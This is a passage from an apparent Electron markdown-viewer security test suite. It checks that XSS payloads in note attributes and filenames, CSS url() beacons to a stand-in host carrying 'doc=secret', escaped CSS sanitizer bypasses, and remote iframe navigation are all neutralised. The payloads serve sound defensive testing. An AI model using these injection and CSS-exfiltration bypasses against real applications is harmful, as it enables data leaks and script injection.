    };
    let retiredPage = null, trapReady = false, finalOpens = null;
    await restore("actual Main settlements", () => n11Wait(() =>
      n11Actions.every(action => !action.entry || action.settled),
    "captured Main actions settle before owned observations are released"));
    await restore("known ordinary source", async () => {
      if (!n11Owner) return;
      if (!await n11Healthy()) throw new Error("Cannot close an uncertain N11 source; fixtures retained");
      await closeSecurityImageFixture(n11Owner, n11SourcePath, n11FixtureBody, n11Heading);
      if (n11Shutdown.documentAdmissionIsCurrent(n11Owner.descriptor.ref) !== false) {
        throw new Error("N11 source Main retirement was not confirmed");
      }
      n11Owner = null;
    });
    await restore("page witness", async () => {
      if (n11PageAttempted || n11PageInstalled) retiredPage = Object.freeze(await n11DisposePage());
    });
    await restore("shared trap readiness", async () => {
      if (!n11AuthorityIntact()) throw new Error("N11 shared trap authority changed before readiness");
      trapReady = await waitForExternalTrap(win);
    });
    // removeListener may invoke application callbacks: finish it before the
    // final synchronous snapshot/comparison/property-release boundary.
    try { n11Contents.removeListener("did-start-navigation", onN11Nav); }
    catch (error) { restorationErrors.push("navigation listener: " + String(error.message || error)); }
    try { finalOpens = n11SnapshotOpens(); }
    catch (error) { restorationErrors.push({ label: "final shared histories", error }); }
    const finalCounts = {
      shell: finalOpens?.shell ?? null, external: finalOpens?.external ?? null,
      entries: n11Entries.length, sends: n11Sends.length, work: n11Work.length,
      navigation: n11Navs.length, faults: n11Faults.length,
      clicks: retiredPage?.clicks ?? null, errors: retiredPage?.errors ?? null,
      notifications: retiredPage?.notifications ?? null,
      dialogs: retiredPage?.dialogs ?? null, confirms: retiredPage?.confirms ?? null,
      sentinel: retiredPage?.sentinel ?? null, modal: retiredPage?.modal ?? null,
    };
    const accounted = n11Sealed !== null && isDeepStrictEqual(finalCounts, n11Sealed) &&
      n11Faults.length === 0 && expectedSecurityQuestion === null && n11AuthorityIntact() && trapReady;
    try {
      if (n11Installed || Object.getOwnPropertyDescriptor(securityGestureRegistration, "observer")?.value === n11Observer) {
        n11RestoreSlot(securityGestureRegistration, "observer", n11Observer, null, n11Slots.observer);
      }
    } catch (error) { restorationErrors.push({ label: "Main gesture observer", error }); }
    try {
      if (n11Installed || Object.getOwnPropertyDescriptor(n11Contents, "send")?.value === n11ObservedSend) {
        n11RestoreSlot(n11Contents, "send", n11ObservedSend, n11Send, n11Slots.send);
      }
    } catch (error) { restorationErrors.push({ label: "Main send", error }); }
    try {
      if (n11Installed || Object.getOwnPropertyDescriptor(n11RealPathHost, "native")?.value === n11ObservedRealPath) {
        n11RestoreSlot(n11RealPathHost, "native", n11ObservedRealPath, n11RealPath, n11Slots.realpath);
      }
    } catch (error) { restorationErrors.push({ label: "realpath", error }); }
    try {
      if (n11Installed || Object.getOwnPropertyDescriptor(fs, "statSync")?.value === n11ObservedStat) {
        n11RestoreSlot(fs, "statSync", n11ObservedStat, n11Stat, n11Slots.stat);
      }
    } catch (error) { restorationErrors.push({ label: "stat", error }); }
    try {
      if (n11Installed || Object.getOwnPropertyDescriptor(fs, "existsSync")?.value === n11ObservedExists) {
        n11RestoreSlot(fs, "existsSync", n11ObservedExists, n11Exists, n11Slots.exists);
      }
    } catch (error) { restorationErrors.push({ label: "exists", error }); }
    try {
      if (n11Installed || Object.getOwnPropertyDescriptor(fs, "readFileSync")?.value === n11ObservedRead) {
        n11RestoreSlot(fs, "readFileSync", n11ObservedRead, n11ReadFile, n11Slots.read);
      }
    } catch (error) { restorationErrors.push({ label: "read", error }); }
    n11FSDrainDepth--;
    const restored = Object.getOwnPropertyDescriptor(securityGestureRegistration, "observer")?.value === null &&
      Object.getOwnPropertyDescriptor(securityGestureRegistration, "handler")?.value === n11Registration.handler &&
      Object.getOwnPropertyDescriptor(securityGestureRegistration, "installed")?.value === n11Registration.installed &&
      Object.getOwnPropertyDescriptor(securityGestureRegistration, "count")?.value === 1 &&
      n11DataSlotValue(n11Contents, "send") === n11Send &&
      Object.getOwnPropertyDescriptor(fs, "realpathSync")?.value === n11RealPathHost &&
      Object.getOwnPropertyDescriptor(n11RealPathHost, "native")?.value === n11RealPath &&
      Object.getOwnPropertyDescriptor(fs, "statSync")?.value === n11Stat &&
      Object.getOwnPropertyDescriptor(fs, "existsSync")?.value === n11Exists &&
      Object.getOwnPropertyDescriptor(fs, "readFileSync")?.value === n11ReadFile &&
      isDeepStrictEqual(Object.getOwnPropertyDescriptor(securityGestureRegistration, "observer"), n11Slots.observer) &&
      isDeepStrictEqual(Object.getOwnPropertyDescriptor(n11Contents, "send"), n11Slots.send) &&
      isDeepStrictEqual(Object.getOwnPropertyDescriptor(n11RealPathHost, "native"), n11Slots.realpath) &&
      isDeepStrictEqual(Object.getOwnPropertyDescriptor(fs, "statSync"), n11Slots.stat) &&
      isDeepStrictEqual(Object.getOwnPropertyDescriptor(fs, "existsSync"), n11Slots.exists) &&
      isDeepStrictEqual(Object.getOwnPropertyDescriptor(fs, "readFileSync"), n11Slots.read) &&
      expectedSecurityQuestion === null && n11AuthorityIntact() && trapReady;
    // Both verdicts precede reporting or error formatting: neither can reenter
    // application getters between the retained snapshot and descriptor release.
    // Reporting is outside the uninterrupted terminal comparison/release tail.
    const restorationMessages = restorationErrors.map(item => typeof item === "string" ? item :
      item.label + ": " + String(item.error.message || item.error));
    check("N11 final immutable accounting covers asynchronous owner/page disposal", accounted,
      JSON.stringify({ sealed: n11Sealed, finalCounts, faults: n11Faults,
        recoveryLoads: n11RecoveryLoads,
        readinessErrors: n11ReadinessErrors }));
    check("N11 owned Main observations restore exact identities and retain the shared trap",
      restored && restorationErrors.length === 0, JSON.stringify(restorationMessages));
    if (!accounted || !restored || restorationErrors.length) {
      throw new Error("N11 terminal accounting/restoration failed; fixtures retained: " +
        restorationMessages.join("; ") +
        (n11Failure ? "\nOriginal ordinary failure: " + String(n11Failure.stack || n11Failure) : ""));
    }
  }
  }

  // ==========================================================================
  // SEC-13 / SEC-14 - attacker-controlled strings reaching innerHTML in the
  // app's own chrome (notes tooltip, All-Notes panel, recent-files menu).
  //
  // These are not part of the rendered document, so the render-pipeline
  // assertions above say nothing about them. `data-note-id`, `data-note-title`,
  // `data-note-content` and `data-note-color` are all explicitly allowlisted in
  // the DOMPurify config, so their values arrive here exactly as authored.
  // ==========================================================================
  const NOTE_PAYLOAD_ID = `1"><img src=x onerror="window.__pwned='note-id'">`;
  const NOTE_PAYLOAD_COLOR = `red"><img src=x onerror="window.__pwned='note-color'">`;
  const htmlAttr = (s) =>
    s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

  const SEC13_NOTE_DOCUMENT = [
    "# Notes chrome",
    "",
    `Here is <span class="noted-text" data-note-id="${htmlAttr(NOTE_PAYLOAD_ID)}" ` +
      `data-note-color="${htmlAttr(NOTE_PAYLOAD_COLOR)}" ` +
      `data-note-title="Title" data-note-content="Body">noted</span> text.`,
    "",
  ].join("\n");
  const sec13NoteFile = path.join(dir, "sec13-notes.md");
  const sec13Contents = win.webContents;
  const sec13Frame = sec13Contents.mainFrame;
  const sec13Url = sec13Contents.getURL();
  const sec13AuthorityIntact = () =>
    win === observedMain && !win.isDestroyed() && win.webContents === sec13Contents &&
    !sec13Contents.isDestroyed() && sec13Contents.mainFrame === sec13Frame &&
    !sec13Frame.isDestroyed() && sec13Contents.getURL() === sec13Url &&
    sec13Frame.url === sec13Url && securityDialogGuardsIntact() &&
    expectedSecurityQuestion === null && chooserAllowance === null;
  if (!sec13AuthorityIntact()) throw new Error("SEC-13 has no current guarded Main owner");
  await exec(`(() => {
    if (window.__securitySec13 || !Array.isArray(window.__e2eErrors)) {
      throw new Error('SEC-13 requires the existing current-page sentinel');
    }
    window.__securitySec13 = Object.freeze({
      errors: window.__e2eErrors, tabs: window.CustomTabs, folia: window.folia,
      session: window.getReloadRequestSession()
    });
    window.__pwned = null;
    window.__lastRenderError = null;
    window.__e2eErrors.length = 0;
    return true;
  })()`);
  const sec13NoteOwner = await admitSecurityImageFixture(
    sec13NoteFile, SEC13_NOTE_DOCUMENT, "Notes chrome", [], [],
  );
  const sec13Observe = async label => {
    const owner = await readSecurityImageOwner(sec13NoteFile);
    const observation = await exec(`(() => {
      const p = window.__securitySec13;
      if (!p || p.errors !== window.__e2eErrors || p.tabs !== window.CustomTabs ||
          p.folia !== window.folia || p.session !== window.getReloadRequestSession()) {
        throw new Error('SEC-13 observation lost its original page or sentinel');
      }
      return {pwned:window.__pwned,renderError:window.__lastRenderError,errors:p.errors.slice()};
    })()`);
    const current = sec13AuthorityIntact() &&
      securityImageOwnerMatches(owner, sec13NoteFile, SEC13_NOTE_DOCUMENT, "Notes chrome") &&
      owner.id === sec13NoteOwner.id && owner.pageSession === sec13NoteOwner.pageSession &&
      owner.descriptor.ref === sec13NoteOwner.descriptor.ref &&
      isDeepStrictEqual(owner.identity, sec13NoteOwner.identity);
    const safe = observation.pwned === null && observation.renderError === null &&
      observation.errors.length === 0;
    check("SEC-13 retains its admitted note owner and cumulative observations: " + label,
      current && safe, JSON.stringify({owner,observation}));
    if (!current || !safe) throw new Error("SEC-13 note admission or observation failed: " + label);
  };
  // Admission renders first; never erase its evidence before the forced-full case.
  await sleep(900);
  await sec13Observe("native admission");
  await exec(`(async () => {
    try { await window.renderMarkdown(${JSON.stringify(SEC13_NOTE_DOCUMENT)}, "full"); }
    catch (error) { window.__lastRenderError = String(error && error.message || error); }
    return null;
  })()`);
  await sleep(900);
  await sec13Observe("forced-full rendering");

  const attrsSurvived = await exec(`
    (() => {
      const el = document.querySelector('#viewer .noted-text');
      if (!el) return { found: false };
      return {
        found: true,
        id: el.getAttribute('data-note-id'),
        color: el.getAttribute('data-note-color'),
      };
    })()
  `);
  // Without this the two assertions below could pass simply because DOMPurify
  // stripped the attributes and there was never anything to escape.
  check(
    "SEC-13 the payload really does survive DOMPurify into data-note-* (control)",
    attrsSurvived.found === true &&
      attrsSurvived.id === NOTE_PAYLOAD_ID &&
      attrsSurvived.color === NOTE_PAYLOAD_COLOR,
    JSON.stringify(attrsSurvived),
  );

  const panel = await exec(`
    (() => {
      updateNotesList();
      const list = document.getElementById('notesList');
      const idSpan = list.querySelector('.notes-item-id');
      const item = list.querySelector('.notes-item');
      let clickThrew = null;
      try { item && item.click(); } catch (e) { clickThrew = String(e && e.message || e); }
      return {
        injected: list.querySelectorAll('img, script, iframe').length,
        idText: idSpan ? idSpan.textContent : null,
        borderLeftColor: item ? getComputedStyle(item).borderLeftColor : null,
        clickThrew,
        pwned: window.__pwned,
      };
    })()
  `);
  await sleep(200);
  check(
    "SEC-13 a data-note-id payload renders as text in the All-Notes panel",
    panel.injected === 0 &&
      panel.idText === "#" + NOTE_PAYLOAD_ID &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(panel),
  );
  check(
    "SEC-13 a data-note-color payload is normalized away rather than applied",
    panel.borderLeftColor === "rgb(255, 102, 0)",
    JSON.stringify(panel),
  );
  // The listener runs asynchronously, so a broken selector surfaces as an
  // uncaught error rather than a throw at the .click() call site - checking
  // only clickThrew would miss it entirely.
  const panelClickErrors = await exec(`window.__e2eErrors.slice()`);
  check(
    "SEC-13 clicking the panel item does not break the attribute selector",
    panel.clickThrew === null && panelClickErrors.length === 0,
    JSON.stringify({ clickThrew: panel.clickThrew, errors: panelClickErrors }),
  );

  const tip = await exec(`
    (() => {
      const el = document.querySelector('#viewer .noted-text');
      showNoteTooltip(el, true);
      const t = document.getElementById('noteTooltip');
      return {
        injected: t.querySelectorAll('img, script, iframe').length,
        text: t.textContent,
        closeButtons: t.querySelectorAll('.note-tooltip-close').length,
      };
    })()
  `);
  await sleep(200);
  check(
    "SEC-13 a data-note-id payload renders as text in the note tooltip",
    tip.injected === 0 &&
      tip.text.includes(NOTE_PAYLOAD_ID) &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(tip),
  );
  check(
    "FEATURE the pinned tooltip still has a working close button",
    tip.closeButtons === 1,
    JSON.stringify(tip),
  );
  await exec(`closeNoteTooltip(); null`);
  await sec13Observe("panel and tooltip checks");
  await exec(`document.getElementById('noteTooltip').replaceChildren(); true`);
  await closeSecurityImageFixture(
    sec13NoteOwner, sec13NoteFile, SEC13_NOTE_DOCUMENT, "Notes chrome",
  );
  const sec13Retired = await exec(`(() => {
    const p = window.__securitySec13;
    if (!p || p.errors !== window.__e2eErrors || p.tabs !== window.CustomTabs ||
        p.folia !== window.folia || p.session !== window.getReloadRequestSession()) {
      throw new Error('SEC-13 cleanup lost its original page or sentinel');
    }
    updateNotesList();
    updateShowNotesToggleVisibility();
    const clean = window.__pwned === null && window.__lastRenderError === null &&
      p.errors.length === 0 && !document.querySelector('#notesList .notes-item') &&
      document.getElementById('noteTooltip').childElementCount === 0;
    delete window.__securitySec13;
    return clean;
  })()`);
  check("SEC-13 retires its note owner and stale chrome before later actors",
    sec13AuthorityIntact() && sec13Retired);
  if (!sec13AuthorityIntact() || !sec13Retired) {
    throw new Error("SEC-13 note owner or chrome cleanup did not complete");
  }

  // SEC-14: `<`, `>`, `"` and `&` are all legal in filenames on the Linux and
  // macOS release targets, and recent files are persisted, so a hostile name
  // re-arms the payload on every launch.
  const RECENT_PAYLOAD = `/tmp/<img src=x onerror="window.__pwned='recent'">.md`;
  const recent = await exec(`
    (() => {
      window.__pwned = null;
      const saved = localStorage.getItem('recentFiles');
      try {
        saveRecentFile(${JSON.stringify(RECENT_PAYLOAD)});
        updateFileMenuRecent();
        const host = document.getElementById('fileMenuRecent');
        const name = host.querySelector('.tools-menu-recent-name');
        return {
          injected: host.querySelectorAll('img, script, iframe').length,
          nameText: name ? name.textContent : null,
          pathText: host.querySelector('.tools-menu-recent-path').textContent,
        };
      } finally {
        if (saved === null) localStorage.removeItem('recentFiles');
        else localStorage.setItem('recentFiles', saved);
        updateFileMenuRecent();
      }
    })()
  `);
  await sleep(200);
  check(
    "SEC-14 a hostile filename renders as text in the recent-files menu",
    recent.injected === 0 &&
      recent.nameText === `<img src=x onerror="window.__pwned='recent'">.md` &&
      recent.pathText === RECENT_PAYLOAD &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(recent),
  );

  // <iframe> is in ADD_TAGS (for @@@html) and `src` is allowed by DOMPurify by
  // default, so `<iframe src="https://…">` in plain markdown would otherwise
  // fetch and run a remote page with no click at all. The app's own iframes are
  // srcdoc-only, so `src` is stripped in the sanitizer hook.
  await render(
    '# Nav\n\n<iframe src="https://probe.invalid/frame"></iframe>\n',
    "full",
    1200,
  );
  const frameState = await exec(`
    (() => {
      const f = document.querySelector('#viewer iframe');
      return {
        // Control: the iframe element itself must still be there, otherwise
        // this passes because the render failed rather than because src went.
        present: !!f,
        src: f ? f.getAttribute('src') : 'NO-IFRAME',
        sandbox: f ? f.getAttribute('sandbox') : null
      };
    })()
  `);
  check(
    "SEC-11 a remote <iframe src> is stripped, the sandboxed element survives",
    frameState.present === true &&
      frameState.src === null &&
      frameState.sandbox === "allow-scripts",
    JSON.stringify(frameState),
  );

  // SEC-21 - inline `style` cannot be removed from the allowlist (notes, themes
  // and upstream markdown all use it), so CSS is a fetch surface the link policy
  // never sees. `img-src https:` is deliberately open, so the CSP does not stop
  // a background-image beacon either. These drive the real sanitizer.
  await render(
    "# CSS\n\n" +
      '<div id="css-remote" style="color:rgb(1,2,3);background-image:url(https://probe.invalid/beacon?doc=secret)">a</div>\n\n' +
      '<div id="css-escaped" style="background-image:url(\\68 ttps://probe.invalid/esc)">b</div>\n\n' +
      '<div id="css-share" style="background-image:url(//probe.invalid/share/x.png)">c</div>\n\n' +
      '<div id="css-imageset" style="background-image:-webkit-image-set(&quot;https://probe.invalid/set.png&quot; 1x)">d</div>\n\n' +
      '<div id="css-data" style="background-image:url(data:image/png;base64,iVBORw0KGgo=)">e</div>\n\n' +
      '<div id="css-relative" style="background-image:url(pics/local.png)">f</div>\n\n' +
      "<style>@import url(https://probe.invalid/sheet.css); .x { background: url(https://probe.invalid/in-style.png); }</style>\n",
    "full",
    1200,
  );
  const cssState = await exec(`
    (() => {
      const at = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('style') || '') : 'NO-ELEMENT';
      };
      const styleEl = document.querySelector('#viewer style');
      return {
        remote: at('css-remote'),
        escaped: at('css-escaped'),
        share: at('css-share'),
        imageset: at('css-imageset'),
        data: at('css-data'),
        relative: at('css-relative'),
        styleText: styleEl ? styleEl.textContent : 'NO-STYLE-ELEMENT'
      };
    })()
  `);
  const noProbe = (s) => typeof s === "string" && !s.includes("probe.invalid");
  check(
    "SEC-21 a remote CSS url() in a style attribute is neutralised",
    noProbe(cssState.remote) && cssState.remote.includes('url("about:blank")'),
    JSON.stringify(cssState.remote),
  );
  // Control: neutralising the URL must not destroy the rest of the declaration,
  // otherwise the fix is indistinguishable from dropping `style` altogether -
  // which is the outcome this whole entry exists to avoid.
  check(
    "SEC-21 the surviving declarations in that style attribute are untouched",
    typeof cssState.remote === "string" &&
      /rgb\(1,\s*2,\s*3\)/.test(cssState.remote),
    JSON.stringify(cssState.remote),
  );
  check(
    "SEC-21 a CSS-escaped scheme (\\68 ttps:) does not bypass the filter",
    noProbe(cssState.escaped) && cssState.escaped.includes('url("about:blank")'),
    JSON.stringify(cssState.escaped),
  );
  check(
    "SEC-21 a protocol-relative CSS url() is neutralised (SMB/NTLM leak)",
    noProbe(cssState.share) && cssState.share.includes('url("about:blank")'),
    JSON.stringify(cssState.share),
  );
  check(
    "SEC-21 image-set(), which needs no url() wrapper, is neutralised too",
    noProbe(cssState.imageset),
    JSON.stringify(cssState.imageset),
  );
  check(
    "SEC-21 an inert data:image URL is kept, so legitimate CSS still works",
    typeof cssState.data === "string" &&
      cssState.data.includes("data:image/png;base64"),
    JSON.stringify(cssState.data),
  );
  check(
    "SEC-21 a relative CSS url() is kept",
    typeof cssState.relative === "string" &&
      cssState.relative.includes("pics/local.png") &&
      !cssState.relative.includes("about:blank"),
    JSON.stringify(cssState.relative),
  );
  check(
    "SEC-21 a <style> element's text is filtered, and @import removed entirely",
    typeof cssState.styleText === "string" &&
      cssState.styleText !== "NO-STYLE-ELEMENT" &&
      !cssState.styleText.includes("probe.invalid") &&
      !/@import/i.test(cssState.styleText),
    JSON.stringify(cssState.styleText),
  );

  // The three bypass classes below were all found by independent review AFTER
  // the first version of this filter passed its own tests, and all three were
  // confirmed live against Chromium (the engine really does resolve them to a
  // fetch) before being fixed. They are the reason the filter now normalises
  // through Chromium's own parser instead of trusting hand-written regexes:
  //
  //   1. `url("ht\<LF>tps://…")` - a backslash-newline line continuation inside
  //      a string is consumed by CSS and produces nothing, so the engine sees a
  //      scheme where the regex saw none.
  //   2. `\75rl(…)`, `\69mage-set(…)`, `@im\70ort` - the *identifier* can be
  //      escaped too, not just the value inside it.
  //   3. an SVG-namespaced <style>, whose localName is lower case.
  await render(
    "# Escapes\n\n" +
      '<div id="esc-nl" style="background-image:url(&quot;ht\\\ntps://probe.invalid/nl&quot;)">a</div>\n\n' +
      '<div id="esc-fn" style="background-image:\\75rl(//probe.invalid/share/fn.png)">b</div>\n\n' +
      "<div id=\"esc-set\" style=\"background-image:\\69mage-set('https://probe.invalid/set2.png' 1x)\">c</div>\n\n" +
      '<div id="esc-var" style="--evil:url(&quot;ht\\\ntps://probe.invalid/varleak&quot;);background-image:var(--evil)">d</div>\n\n' +
      '<style>@im\\70ort "https://probe.invalid/escaped-import.css"; .z { background: url(https://probe.invalid/z.png); }</style>\n\n' +
      '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
      "<style>.s{background:url(&quot;https://probe.invalid/svgstyle&quot;)}</style>" +
      '<rect id="esc-svgrect" width="10" height="10" style="fill:red;background-image:url(https://probe.invalid/svgattr)"/>' +
      "</svg>\n",
    "full",
    1200,
  );
  const escState = await exec(`
    (() => {
      const at = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('style') || '') : 'NO-ELEMENT';
      };
      const styles = [...document.querySelectorAll('#viewer style')].map(s => s.textContent);
      return {
        nl: at('esc-nl'),
        fn: at('esc-fn'),
        set: at('esc-set'),
        varLeak: at('esc-var'),
        svgRect: at('esc-svgrect'),
        styleTexts: styles,
        // Control: the SVG must actually have survived sanitization, otherwise
        // the SVG assertions below pass because nothing rendered.
        svgPresent: !!document.querySelector('#viewer svg')
      };
    })()
  `);
  check(
    "SEC-21 a backslash-newline line continuation does not hide a scheme",
    noProbe(escState.nl),
    JSON.stringify(escState.nl),
  );
  check(
    "SEC-21 an escaped url() identifier (\\75rl) is still filtered",
    noProbe(escState.fn),
    JSON.stringify(escState.fn),
  );
  check(
    "SEC-21 an escaped image-set() identifier (\\69mage-set) is still filtered",
    noProbe(escState.set),
    JSON.stringify(escState.set),
  );
  // Custom properties are stored as raw token streams and are NOT canonicalised
  // by the engine, so var() is an independent route to a live URL.
  check(
    "SEC-21 a remote URL smuggled through a CSS custom property is filtered",
    noProbe(escState.varLeak),
    JSON.stringify(escState.varLeak),
  );
  check(
    "SEC-21 an escaped at-keyword (@im\\70ort) does not survive",
    Array.isArray(escState.styleTexts) &&
      escState.styleTexts.every((t) => !/probe\.invalid/.test(t)) &&
      escState.styleTexts.every((t) => !/@im/i.test(t)),
    JSON.stringify(escState.styleTexts),
  );
  check(
    "SEC-21 an SVG-namespaced <style> is filtered too (localName is lower case)",
    escState.svgPresent === true &&
      Array.isArray(escState.styleTexts) &&
      escState.styleTexts.every((t) => !/svgstyle/.test(t)),
    JSON.stringify({ present: escState.svgPresent, styles: escState.styleTexts }),
  );
  check(
    "SEC-21 a style attribute on an SVG element is filtered",
    noProbe(escState.svgRect),
    JSON.stringify(escState.svgRect),
  );

  // The SEC-21 hook rewrites the `style` attribute on EVERY sanitized document,
  // so it can plausibly break ordinary formatting rather than only the hostile
  // case. The assertions above cannot see that - they read attribute text, not
  // pixels. This renders a document of ordinary inline-styled markdown and
  // leaves a screenshot for a human to look at, which is how the mermaid theme
  // bug was caught after seventeen geometry assertions missed it.
  await render(
    "# Styled document\n\n" +
      '<p style="color:#e06c75;font-size:20px">Coloured, larger text.</p>\n\n' +
      '<p style="background:#2c313a;padding:12px;border-left:4px solid #61afef">' +
      "A callout with a background, padding and a border.</p>\n\n" +
      '<span style="font-weight:bold">Bold via inline style</span> and ' +
      '<span style="text-decoration:underline">underline</span>.\n\n' +
      "| Col | Value |\n|---|---|\n| a | 1 |\n| b | 2 |\n",
    "full",
    900,
  );
  const styledZoomFactor = win.webContents.getZoomFactor();
  if (!Number.isFinite(styledZoomFactor) || styledZoomFactor <= 0) {
    throw new Error("Styled-border probe has no valid Main-owned page zoom");
  }
  const styledLook = await exec(`
    (() => {
      const ps = [...document.querySelectorAll('#viewer p')];
      const cs = (el) => el ? getComputedStyle(el) : null;
      const a = cs(ps[0]);
      const b = cs(ps[1]);
      // BORDER WIDTHS ARE SNAPPED TO WHOLE DEVICE PIXELS; padding, font size
      // and colour are not - which is why every other value here is exact and
      // this one is not. Measured on a real machine: 3.84px, which is 6 device
      // pixels at an effective scale of 1.5625, for a declared 4px. An oracle
      // that demanded the literal string "4px" was asserting that the display
      // scale divides 4 into whole device pixels, and failed on the platform
      // rather than on the product.
      //
      // THE SCALE IS DERIVED FROM THE PLATFORM, NOT GUESSED. Chromium's
      // window.devicePixelRatio is deviceScaleFactor x pageZoomFactor when
      // zoom-for-DSF is on (the Windows default), and Main's getZoomFactor()
      // is the page zoom alone - so multiplying them together DOUBLE-COUNTS the
      // zoom on that configuration and is correct on the other. Rather than
      // assume which build this is, both compositions are enumerated and the
      // observation must match one of them EXACTLY.
      const zoomFactor = ${JSON.stringify(styledZoomFactor)};
      const dpr = window.devicePixelRatio || 1;
      const candidates = [];
      if (Number.isFinite(dpr) && dpr > 0) candidates.push({ how: "devicePixelRatio", scale: dpr });
      if (Number.isFinite(zoomFactor) && zoomFactor > 0 && Math.abs(zoomFactor - 1) > 1e-9) {
        candidates.push({ how: "devicePixelRatio*zoomFactor", scale: dpr * zoomFactor });
      }
      // What a declared width of n CSS px is actually painted as at scale s.
      // Chromium snaps the used value to whole device pixels, with a floor of
      // one device pixel for any non-zero declaration.
      const usedAt = (n, s) => (n === 0 ? 0 : Math.max(1, Math.round(n * s)) / s);
      const borderPx = b ? parseFloat(b.borderLeftWidth) : NaN;
      const near = (x, y) => Math.abs(x - y) < 1e-6;
      let matched = null;
      for (const candidate of candidates) {
        const four = usedAt(4, candidate.scale);
        if (!near(borderPx, four)) continue;
        // AND IT IS NOT ALSO WHAT A NARROWER DECLARATION WOULD PAINT AS. This
        // is what keeps the oracle decisive rather than tolerant: a removed
        // declaration, a hairline, a 2px or a 3px regression each paint a
        // different used value at this same scale, and none of them may be
        // confusable with the one accepted here.
        const collides = [0, 1, 2, 3].some((n) => near(usedAt(n, candidate.scale), four));
        if (!collides) matched = { how: candidate.how, scale: candidate.scale, expected: four };
      }
      return {
        colour: a && a.color,
        size: a && a.fontSize,
        background: b && b.backgroundColor,
        padding: b && b.paddingLeft,
        border: b && b.borderLeftWidth,
        borderPx: borderPx,
        devicePixelRatio: dpr,
        zoomFactor: zoomFactor,
        candidates: candidates,
        matched: matched,
        // Reported so a future mismatch is diagnosable from the FAIL line
        // alone: these are what a 0/1/2/3 px declaration would have painted.
        narrowerWidths: candidates.length
          ? [0, 1, 2, 3].map((n) => usedAt(n, candidates[0].scale))
          : [],
      };
    })()
  `);
  // Tier-1 gate for the same thing the screenshot shows, so this never depends
  // on someone remembering to look.
  check(
    "SEC-21 ordinary inline styling still reaches the rendered page",
    styledLook.colour === "rgb(224, 108, 117)" &&
      styledLook.size === "20px" &&
      styledLook.background === "rgb(44, 49, 58)" &&
      styledLook.padding === "12px" &&
      // The setup itself has to be sound: a scale that could not be read at all
      // would make the border term meaningless.
      Number.isFinite(styledLook.devicePixelRatio) &&
      styledLook.devicePixelRatio > 0 &&
      Array.isArray(styledLook.candidates) &&
      styledLook.candidates.length > 0 &&
      // A 4px border, painted the way this display paints 4px, and
      // distinguishable from every narrower declaration at that same scale.
      !!styledLook.matched,
    JSON.stringify(styledLook),
  );
  await captureScreenshot(win, "security-inline-styles");

  // An @@@html frame relocating itself is the one path that exercises the
  // will-frame-navigate branch. Without a test here, inverting the isMainFrame
  // early-return - or deleting the listener - passes the whole suite.
  //
  // Two things this must get right, both learned the hard way:
  //  * webContents.getURL() reports only the TOP frame, so asserting on it is
  //    vacuous - a sandboxed frame navigating *itself* leaves it untouched.
  //    The frame tree has to be inspected directly.
  //  * the target must be REMOTE. A file: target proves nothing, because
  //    Chromium refuses to let a sandboxed, origin-opaque frame reach a local
  //    resource on its own - the test then passes with the guard deleted.
  //    Measured with the guard removed: subframeUrls became
  //    ["https://probe.invalid/frame-probe"], i.e. the frame really does
  //    relocate, and DNS failure does not prevent the URL from committing.
  const frameProbeUrl = "https://probe.invalid/frame-probe";
  await exec(`
    window.__navProbeSeen = false;
    window.addEventListener('message', (e) => {
      if (e.data && e.data.__navProbe) window.__navProbeSeen = true;
    });
    null;
  `);
  const urlBeforeFrame = win.webContents.getURL();
  await render(
    "# Nav\n\n@@@html\n" +
      "<script>parent.postMessage({__navProbe:1},'*');" +
      `location.href=${JSON.stringify(frameProbeUrl)};</script>\n` +
      "@@@\n",
    "full",
    2500,
  );
  const subframeUrls = win.webContents.mainFrame.frames.map((f) => f.url);
  const frameNav = await exec(`
    ({ present: !!document.querySelector('#viewer iframe'),
       ran: window.__navProbeSeen === true })
  `);
  check(
    "SEC-11 an @@@html frame cannot reach a remote origin",
    frameNav.present === true && win.webContents.getURL() === urlBeforeFrame,
    JSON.stringify({ frameNav, subframeUrls, urlBeforeFrame }),
  );
  // Separated from the assertion above on review: it is not a SEC-11 control at
  // all, it is the control for SEC-09's 'unsafe-inline'. An about:srcdoc frame
  // inherits the embedder's policy, so if 'unsafe-inline' were dropped from
  // script-src this inline script would not run and `ran` goes false.
  check(
    "SEC-09 an inline script inside an @@@html srcdoc frame still runs",
    frameNav.ran === true,
    JSON.stringify(frameNav),
  );

  // The end-to-end probe above can no longer tell the two layers apart. Since
  // SEC-09 landed, `default-src 'none'` leaves no frame-src, so Chromium
  // refuses the navigation with ERR_BLOCKED_BY_CSP before will-frame-navigate
  // is consulted - and a CSP-blocked navigation still *commits* an error
  // document, so the frame's own URL becomes the target either way. That kills
  // the discriminator the old assertion relied on: it now passes with the
  // guard deleted, and it cannot be repaired by choosing a different target
  // because the policy permits no frame destination at all.
  //
  // So the guard is exercised directly instead. Emitting the event reproduces
  // exactly what Electron passes the handler, and covers the branch an
  // end-to-end test never could: that isMainFrame is an early *return* and not
  // an early preventDefault, which would make will-navigate unreachable.
  const emitFrameNav = (isMainFrame) => {
    let prevented = false;
    win.webContents.emit("will-frame-navigate", {
      isMainFrame,
      url: "https://probe.invalid/emitted",
      preventDefault() {
        prevented = true;
      },
    });
    return prevented;
  };
  check(
    "SEC-11 will-frame-navigate is armed and denies subframe navigation",
    win.webContents.listenerCount("will-frame-navigate") > 0 &&
      emitFrameNav(false) === true,
  );
  check(
    "SEC-11 will-frame-navigate defers main-frame navigation to will-navigate",
    emitFrameNav(true) === false &&
      win.webContents.listenerCount("will-navigate") > 0,
  );

  // Read this before the navigation probes below: if a navigation guard fails,
  // the document that holds __e2eErrors is replaced and the check would report
  // the wrong thing.
  const errs = await exec(`window.__e2eErrors`);

  // ==========================================================================
  // SEC-11 - navigating the Node-privileged main window
  //
  // Two independent controls, tested separately:
  //   (a) DOMPurify must not emit <form action> / formaction, so the markup
  //       that expresses a one-click navigation never exists;
  //   (b) main.js must deny will-navigate / will-redirect / window.open, so a
  //       navigation the sanitizer cannot see (location assignment, meta
  //       refresh, an @@@html frame) still goes nowhere.
  // ==========================================================================
  await render(
    "# Nav\n\n" +
